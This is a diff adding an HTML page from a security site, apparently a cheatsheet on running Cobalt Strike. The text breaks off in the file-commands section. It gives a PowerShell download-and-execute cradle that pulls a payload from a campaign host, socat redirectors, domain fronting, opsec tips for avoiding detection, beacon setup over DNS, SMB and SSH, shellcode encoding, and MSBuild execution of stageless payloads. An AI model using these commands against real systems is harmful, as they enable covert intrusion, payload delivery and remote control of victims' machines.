@@ -1,0 +1,1496 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Contains cheatsheet/quick reference materials but also dives deep into successfully using Cobalt Strike">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Cobalt Strike" />
+<meta property="og:description" content="Contains cheatsheet/quick reference materials but also dives deep into successfully using Cobalt Strike" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-03T00:00:00+00:00" />
+<title>Cobalt Strike | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.d50fea2a76ff11c274e36eee7c462453fa589bda1ed7236d45eaf1c9b25c1336.js" integrity="sha256-1Q/qKnb/EcJ0427ufEYkU/pYm9oe1yNtRerxybJcEzY=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="active">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Cobalt Strike</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cobalt-strike">Cobalt Strike</a>
+      <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#infrastructure">Infrastructure</a>
+          <ul>
+            <li><a href="#redirectors">Redirectors</a></li>
+            <li><a href="#domain-fronting">Domain Fronting</a></li>
+          </ul>
+        </li>
+        <li><a href="#opsec">OpSec</a>
+          <ul>
+            <li><a href="#customer-id">Customer ID</a></li>
+          </ul>
+        </li>
+        <li><a href="#payloads">Payloads</a>
+          <ul>
+            <li><a href="#dns-beacon">DNS Beacon</a></li>
+            <li><a href="#smb-beacon">SMB Beacon</a></li>
+            <li><a href="#ssh-beacon">SSH Beacon</a></li>
+            <li><a href="#metasploit-compatibility">Metasploit compatibility</a></li>
+            <li><a href="#custom-payloads">Custom Payloads</a></li>
+          </ul>
+        </li>
+        <li><a href="#malleable-c2">Malleable C2</a></li>
+        <li><a href="#files">Files</a></li>
+        <li><a href="#powershell-and-net">Powershell and .NET</a>
+          <ul>
+            <li><a href="#powershell-commands">Powershell commands</a></li>
+            <li><a href="#net-remote-execution">.NET remote execution</a></li>
+          </ul>
+        </li>
+        <li><a href="#lateral-movement">Lateral Movement</a>
+          <ul>
+            <li><a href="#assume-control-of-artifact">Assume Control of Artifact</a></li>
+          </ul>
+        </li>
+        <li><a href="#vpn--pivots">VPN &amp; Pivots</a></li>
+        <li><a href="#kits">Kits</a>
+          <ul>
+            <li><a href="#elevate-kit">Elevate Kit</a></li>
+            <li><a href="#persistence-kit">Persistence Kit</a></li>
+            <li><a href="#resource-kit">Resource Kit</a></li>
+            <li><a href="#artifact-kit">Artifact Kit</a></li>
+            <li><a href="#mimikatz-kit">Mimikatz Kit</a></li>
+            <li><a href="#sleep-mask-kit">Sleep Mask Kit</a></li>
+            <li><a href="#thread-stack-spoofer">Thread Stack Spoofer</a></li>
+          </ul>
+        </li>
+        <li><a href="#beacon-object-files">Beacon Object Files</a></li>
+        <li><a href="#ntlm-relaying-via-cobalt-strike">NTLM Relaying via Cobalt Strike</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="cobalt-strike">
+  Cobalt Strike
+  <a class="anchor" href="#cobalt-strike">#</a>
+</h1>
+<blockquote>
+<p>Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ sudo apt-get update
+</span></span><span style="display:flex;"><span>$ sudo apt-get install openjdk-<span style="color:#ae81ff">11</span>-jdk
+</span></span><span style="display:flex;"><span>$ sudo apt install proxychains socat
+</span></span><span style="display:flex;"><span>$ sudo update-java-alternatives -s java-<span style="color:#ae81ff">1.11</span>.<span style="color:#ae81ff">0</span>-openjdk-amd64
+</span></span><span style="display:flex;"><span>$ sudo ./teamserver <span style="color:#ae81ff">10.10</span>.10.10 <span style="color:#e6db74">&#34;password&#34;</span> [<span style="color:#66d9ef">malleable C2 profile</span>]
+</span></span><span style="display:flex;"><span>$ ./cobaltstrike
+</span></span><span style="display:flex;"><span>$ powershell.exe -nop -w hidden -c <span style="color:#e6db74">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://campaigns.example.com/download/dnsback&#39;))&#34;</span> 
+</span></span></code></pre></div><h2 id="summary">
+  Summary
+  <a class="anchor" href="#summary">#</a>
+</h2>
+<ul>
+<li>
+  <a href="/#infrastructure">Infrastructure</a>
+<ul>
+<li>
+  <a href="/#redirectors">Redirectors</a></li>
+<li>
+  <a href="/#domain-fronting">Domain fronting</a></li>
+</ul>
+</li>
+<li>
+  <a href="/#opsec">OpSec</a>
+<ul>
+<li>
+  <a href="/#customer-id">Customer ID</a></li>
+</ul>
+</li>
+<li>
+  <a href="/#payloads">Payloads</a>
+<ul>
+<li>
+  <a href="/#dns-beacon">DNS Beacon</a></li>
+<li>
+  <a href="/#smb-beacon">SMB Beacon</a></li>
+<li>
+  <a href="/#metasploit-compatibility">Metasploit compatibility</a></li>
+<li>
+  <a href="/#custom-payloads">Custom Payloads</a></li>
+</ul>
+</li>
+<li>
+  <a href="/#malleable-c2">Malleable C2</a></li>
+<li>
+  <a href="/#files">Files</a></li>
+<li>
+  <a href="/#powershell-and-net">Powershell and .NET</a>
+<ul>
+<li>
+  <a href="/#powershell-commands">Powershell commabds</a></li>
+<li>
+  <a href="/#net-remote-execution">.NET remote execution</a></li>
+</ul>
+</li>
+<li>
+  <a href="/#lateral-movement">Lateral Movement</a></li>
+<li>
+  <a href="/#vpn--pivots">VPN &amp; Pivots</a></li>
+<li>
+  <a href="/#kits">Kits</a>
+<ul>
+<li>
+  <a href="/#elevate-kit">Elevate Kit</a></li>
+<li>
+  <a href="/#persistence-kit">Persistence Kit</a></li>
+<li>
+  <a href="/#resource-kit">Resource Kit</a></li>
+<li>
+  <a href="/#artifact-kit">Artifact Kit</a></li>
+<li>
+  <a href="/#mimikatz-kit">Mimikatz Kit</a></li>
+<li>
+  <a href="/#sleep-mask-kit">Sleep Mask Kit</a></li>
+<li>
+  <a href="/#thread-stack-spoofer">Thread Stack Spoofer</a></li>
+</ul>
+</li>
+<li>
+  <a href="/#beacon-object-files">Beacon Object Files</a></li>
+<li>
+  <a href="/#ntlm-relaying-via-cobalt-strike">NTLM Relaying via Cobalt Strike</a></li>
+<li>
+  <a href="/#references">References</a></li>
+</ul>
+<h2 id="infrastructure">
+  Infrastructure
+  <a class="anchor" href="#infrastructure">#</a>
+</h2>
+<h3 id="redirectors">
+  Redirectors
+  <a class="anchor" href="#redirectors">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sudo apt install socat
+</span></span><span style="display:flex;"><span>socat TCP4-LISTEN<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>,fork TCP4<span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#66d9ef">TEAM SERVER</span>]<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><h3 id="domain-fronting">
+  Domain Fronting
+  <a class="anchor" href="#domain-fronting">#</a>
+</h3>
+<ul>
+<li>New Listener &gt; HTTP Host Header</li>
+<li>Choose a domain in &ldquo;Finance &amp; Healthcare&rdquo; sector</li>
+</ul>
+<h2 id="opsec">
+  OpSec
+  <a class="anchor" href="#opsec">#</a>
+</h2>
+<p><strong>Don&rsquo;t</strong></p>
+<ul>
+<li>Use default self-signed HTTPS certificate</li>
+<li>Use default port (50050)</li>
+<li>Use 0.0.0.0 DNS response</li>
+<li>Metasploit compatibility, ask for a payload : <code>wget -U &quot;Internet Explorer&quot; http://127.0.0.1/vl6D</code></li>
+</ul>
+<p><strong>Do</strong></p>
+<ul>
+<li>Use a redirector (Apache, CDN, &hellip;)</li>
+<li>Firewall to only accept HTTP/S from the redirectors</li>
+<li>Firewall 50050 and access via SSH tunnel</li>
+<li>Edit default HTTP 404 page and Content type: text/plain</li>
+<li>No staging <code>set hosts_stage</code> to <code>false</code> in Malleable C2</li>
+<li>Use Malleable Profile to taylor your attack to specific actors</li>
+</ul>
+<h3 id="customer-id">
+  Customer ID
+  <a class="anchor" href="#customer-id">#</a>
+</h3>
+<blockquote>
+<p>The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike.</p>
+</blockquote>
+<ul>
+<li>The Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later.</li>
+<li>The trial has a Customer ID value of 0.</li>
+<li>Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool</li>
+</ul>
+<h2 id="payloads">
+  Payloads
+  <a class="anchor" href="#payloads">#</a>
+</h2>
+<h3 id="dns-beacon">
+  DNS Beacon
+  <a class="anchor" href="#dns-beacon">#</a>
+</h3>
+<ul>
+<li>Edit the Zone File for the domain</li>
+<li>Create an A record for Cobalt Strike system</li>
+<li>Create an NS record that points to FQDN of your Cobalt Strike system</li>
+</ul>
+<p>Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server&rsquo;s A record.</p>
+<ul>
+<li>nslookup jibberish.beacon polling.campaigns.domain.com</li>
+<li>nslookup jibberish.beacon campaigns.domain.com</li>
+</ul>
+<p>Example of DNS on Digital Ocean:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>NS  example.com                     directs to <span style="color:#ae81ff">10.10</span>.10.10.            <span style="color:#ae81ff">86400</span>
+</span></span><span style="display:flex;"><span>NS  polling.campaigns.example.com   directs to campaigns.example.com.	<span style="color:#ae81ff">3600</span>
+</span></span><span style="display:flex;"><span>A	campaigns.example.com           directs to <span style="color:#ae81ff">10.10</span>.10.10	            <span style="color:#ae81ff">3600</span> 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>systemctl disable systemd-resolved
+</span></span><span style="display:flex;"><span>systemctl stop systemd-resolved
+</span></span><span style="display:flex;"><span>rm /etc/resolv.conf
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;nameserver 8.8.8.8&#34;</span> &gt;  /etc/resolv.conf
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;nameserver 8.8.4.4&#34;</span> &gt;&gt;  /etc/resolv.conf
+</span></span></code></pre></div><p>Configuration:</p>
+<ol>
+<li><strong>host</strong>: campaigns.domain.com</li>
+<li><strong>beacon</strong>: polling.campaigns.domain.com</li>
+<li>Interact with a beacon, and <code>sleep 0</code></li>
+</ol>
+<h3 id="smb-beacon">
+  SMB Beacon
+  <a class="anchor" href="#smb-beacon">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>link [<span style="color:#66d9ef">host] [pipename</span>]
+</span></span><span style="display:flex;"><span>connect [<span style="color:#66d9ef">host] [port</span>]
+</span></span><span style="display:flex;"><span>unlink [<span style="color:#66d9ef">host] [PID</span>]
+</span></span><span style="display:flex;"><span>jump [<span style="color:#66d9ef">exec] [host] [pipe</span>]
+</span></span></code></pre></div><p>SMB Beacon uses Named Pipes. You might encounter these error code while running it.</p>
+<table>
+<thead>
+<tr>
+<th>Error Code</th>
+<th>Meaning</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>File Not Found</td>
+<td>There is no beacon for you to link to</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Access is denied</td>
+<td>Invalid credentials or you don&rsquo;t have permission</td>
+</tr>
+<tr>
+<td>53</td>
+<td>Bad Netpath</td>
+<td>You have no trust relationship with the target system. It may or may not be a beacon there.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ssh-beacon">
+  SSH Beacon
+  <a class="anchor" href="#ssh-beacon">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># deploy a beacon</span>
+</span></span><span style="display:flex;"><span>beacon&gt; help ssh
+</span></span><span style="display:flex;"><span>Use<span style="color:#960050;background-color:#1e0010">:</span> ssh [target<span style="color:#960050;background-color:#1e0010">:</span>port] [<span style="color:#66d9ef">user] [pass</span>]
+</span></span><span style="display:flex;"><span>Spawn an SSH client and attempt to login to the specified target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>beacon&gt; help ssh-key
+</span></span><span style="display:flex;"><span>Use<span style="color:#960050;background-color:#1e0010">:</span> ssh [target<span style="color:#960050;background-color:#1e0010">:</span>port] [<span style="color:#66d9ef">user</span>] [/path/to/key.pem]
+</span></span><span style="display:flex;"><span>Spawn an SSH client and attempt to login to the specified target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># beacon&#39;s commands</span>
+</span></span><span style="display:flex;"><span>upload                    Upload a file
+</span></span><span style="display:flex;"><span>download                  Download a file
+</span></span><span style="display:flex;"><span>socks                     Start SOCKS4a server to relay traffic
+</span></span><span style="display:flex;"><span>sudo                      Run a command via sudo
+</span></span><span style="display:flex;"><span>rportfwd                  Setup a reverse port forward
+</span></span><span style="display:flex;"><span>shell                     Execute a command via the shell
+</span></span></code></pre></div><h3 id="metasploit-compatibility">
+  Metasploit compatibility
+  <a class="anchor" href="#metasploit-compatibility">#</a>
+</h3>
+<ul>
+<li>Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https</li>
+<li>Set LHOST and LPORT to the beacon</li>
+<li>Set DisablePayloadHandler to True</li>
+<li>Set PrependMigrate to True</li>
+<li>exploit -j</li>
+</ul>
+<h3 id="custom-payloads">
+  Custom Payloads
+  <a class="anchor" href="#custom-payloads">#</a>
+</h3>
+<p>
+  <a href="https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c">https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>* Attacks &gt; Packages &gt; Payload Generator 
+</span></span><span style="display:flex;"><span>* Attacks &gt; Packages &gt; Scripted Web Delivery (S)
+</span></span><span style="display:flex;"><span>$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
+</span></span><span style="display:flex;"><span>$ C:\Windows\Microsoft.NET\Framework\v4.0.<span style="color:#ae81ff">30319</span>\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
+</span></span><span style="display:flex;"><span>$ <span style="color:#66d9ef">%</span>windir%\Microsoft.NET\Framework\v4.0.<span style="color:#ae81ff">30319</span>\MSBuild.exe \\<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>\Shared\dns_raw_stageless_x86.xml
+</span></span></code></pre></div><h2 id="malleable-c2">
+  Malleable C2
+  <a class="anchor" href="#malleable-c2">#</a>
+</h2>
+<p>List of Malleable Profiles hosted on Github</p>
+<ul>
+<li>Cobalt Strike - Malleable C2 Profiles 
+  <a href="https://github.com/xx0hcd/Malleable-C2-Profiles">https://github.com/xx0hcd/Malleable-C2-Profiles</a></li>
+<li>Cobalt Strike Malleable C2 Design and Reference Guide 
+  <a href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a></li>
+<li>Malleable-C2-Profiles 
+  <a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></li>
+<li>SourcePoint is a C2 profile generator 
+  <a href="https://github.com/Tylous/SourcePoint">https://github.com/Tylous/SourcePoint</a></li>
+</ul>
+<p>Example of syntax</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>set useragent <span style="color:#e6db74">&#34;SOME AGENT&#34;</span>; <span style="color:#75715e"># GOOD</span>
+</span></span><span style="display:flex;"><span>set useragent <span style="color:#e6db74">&#39;SOME AGENT&#39;</span>; <span style="color:#75715e"># BAD</span>
+</span></span><span style="display:flex;"><span>prepend <span style="color:#e6db74">&#34;This is an example;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Escape Double quotes</span>
+</span></span><span style="display:flex;"><span>append <span style="color:#e6db74">&#34;here is \&#34;</span>some\<span style="color:#e6db74">&#34; stuff&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Escape Backslashes</span>
+</span></span><span style="display:flex;"><span>append <span style="color:#e6db74">&#34;more \\ stuff&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Some special characters do not need escaping</span>
+</span></span><span style="display:flex;"><span>prepend <span style="color:#e6db74">&#34;!@#$%^&amp;*()&#34;</span>;
+</span></span></code></pre></div><p>Check a profile with <code>./c2lint</code>.</p>
+<ul>
+<li>A result of 0 is returned if c2lint completes with no errors</li>
+<li>A result of 1 is returned if c2lint completes with only warnings</li>
+<li>A result of 2 is returned if c2lint completes with only errors</li>
+<li>A result of 3 is returned if c2lint completes with both errors and warning</li>
+</ul>
+<h2 id="files">
+  Files
+  <a class="anchor" href="#files">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># List the file on the specified directory</span>
+</span></span><span style="display:flex;"><span>beacon &gt; ls &lt;C:\Path&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change into the specified working directory</span>
+</span></span><span style="display:flex;"><span>beacon &gt; cd [<span style="color:#66d9ef">directory</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Delete a file\folder</span>
+</span></span><span style="display:flex;"><span>beacon &gt; rm [file\folder]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># File copy</span>
+</span></span><span style="display:flex;"><span>beacon &gt; cp [<span style="color:#66d9ef">src] [dest</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download a file from the path on the Beacon host</span>
+</span></span><span style="display:flex;"><span>beacon &gt; download [C:\filePath]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lists downloads in progress</span>
+</span></span><span style="display:flex;"><span>beacon &gt; downloads
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cancel a download currently in progress</span>
+</span></span><span style="display:flex;"><span>beacon &gt; cancel [*file*]
+</span></span><span style="display:flex;"><span>
